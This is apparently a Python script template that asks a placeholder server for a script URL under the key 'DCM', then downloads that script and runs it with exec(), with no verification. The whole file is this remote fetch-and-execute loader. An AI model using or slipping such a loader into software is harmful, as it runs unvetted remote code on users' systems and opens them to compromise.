import requests


def fetch_script_url(key):
    try:
        response = requests.get("##WEBSITEURL##/pythonhoster/index.php", params={"key": key})
        if response.status_code == 200:
            return response.text.strip()  # Return fetched script URL
        else:
            print("Failed to fetch script URL from server:", response.status_code)
            return None
    except Exception as e:
        print("Error:", e)
        return None

def fetch_and_execute_script(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            script_content = response.text
            exec(script_content)  # Execute fetched script
        else:
            print("Failed to fetch script from URL:", url)
    except Exception as e:
        print("Error:", e)

def main():
    key = "DCM"  # The selected script
    script_url = fetch_script_url(key)
    if script_url:
        fetch_and_execute_script(script_url)
    else:
        print("Failed to fetch script URL for key:", key)

if __name__ == "__main__":
    main()
